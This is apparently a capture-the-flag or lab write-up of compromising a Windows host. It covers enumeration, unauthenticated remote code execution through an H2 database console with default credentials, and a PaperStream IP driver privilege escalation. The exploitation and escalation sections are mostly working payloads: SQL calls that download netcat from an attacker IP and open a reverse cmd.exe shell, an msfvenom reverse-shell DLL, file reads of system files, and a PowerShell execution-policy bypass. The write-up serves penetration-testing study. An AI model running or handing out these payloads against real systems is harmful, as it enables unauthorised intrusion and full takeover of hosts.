#Pwned! 
```IP
 192.168.204.66
```
# Enumeration
## SMB
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241124130616.png?raw=true)
## RPC

## HTTP 80
IIS 10.0
H2 free java sql database engine
Version 1.4.199 ????

/html
```
links.html
license.html
faq.html
stylesheet.css
main.html
download.html
history.html
frame.html
advanced.html
features.html
search.js
source.html
tutorial.html
changelog.html
build.html
```
/text
/help
/javadoc
```
index.html
stylesheet.css
animate.js
overview.html
```
JDBC API
## HTTP 8082
H2 login page
it is possible to acces with user sa and blank password
## 4451 
ctisystemmsg
## 5040

## 7680
pando-pub

## 9092
XmlIpcRegSvc
## 9282
swtp-port2
# Exploitation
## H2 database engine
Unauthenthicated RCE
https://gist.githubusercontent.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed/raw/152ffcd996497e01cfee1ceb7237375f1a1e72f2/h2-exploit.py
```
python h2_rce.py -H  192.168.204.66:8082 -d jdbc:h2:~/test
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241124121924.png?raw=true)
we can read files
```
SELECT FILE_READ('C:\Windows\System32\drivers\etc\hosts', NULL);
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241124125220.png?raw=true)
```
CREATE ALIAS REVEXEC AS $$ String shellexec(String cmd) throw java.io.IOException {java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : ""; }$$;
```
However it doesnt seem capable of running alias statements
Another exploit
https://www.exploit-db.com/exploits/49384
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241124131339.png?raw=true)
```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("curl http://192.168.45.185:80/nc64.exe -o C:/Windows/Temp/nc.exe").getInputStream()).useDelimiter("\\Z").next()');
```
```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Windows/Temp/nc.exe 192.168.45.185 8082 -e cmd.exe").getInputStream()).useDelimiter("\\Z").next()');
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241124134446.png?raw=true)

# PrivEsc

## Manual
Our shell doesnt work very well...
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241124135917.png?raw=true)


![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241124152803.png?raw=true)
PaperStream IP driver 1.42

Seems like there is a Local PE exploit for this
https://www.exploit-db.com/exploits/49382

we follow the instructions
```
msfvenom -p windows/x64/shell_reverse_tcp -f dll -o shell.dll LHOST=192.168.45.185 LPORT=8082
```
from /windows/system32 we can run some commands, and we can verify that the target runs in an x64 archistecture
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241124154714.png?raw=true)

```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("curl http://192.168.45.185:8000/shell.dll -o C:/Windows/Temp/UninOldIS.dll").getInputStream()).useDelimiter("\\Z").next()');
```
```
curl http://192.168.45.185:8000/PaperTemp.ps1 -o C:\Windows\Temp\PaperTemp.ps1
```
```
curl http://192.168.45.185:8000/shell.dll -o C:\Windows\Temp\UninOldIS.dll
```
powershell directory
```
cd C:\Windows\System32\WindowsPowerShell\v1.0
```
```
powershell.exe -ep bypass C:\Windows\Temp\PaperTemp.ps1
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241124162237.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241124162349.png?raw=true)
## Automated

### Peass
### Mimikatz

# Lateral Movement

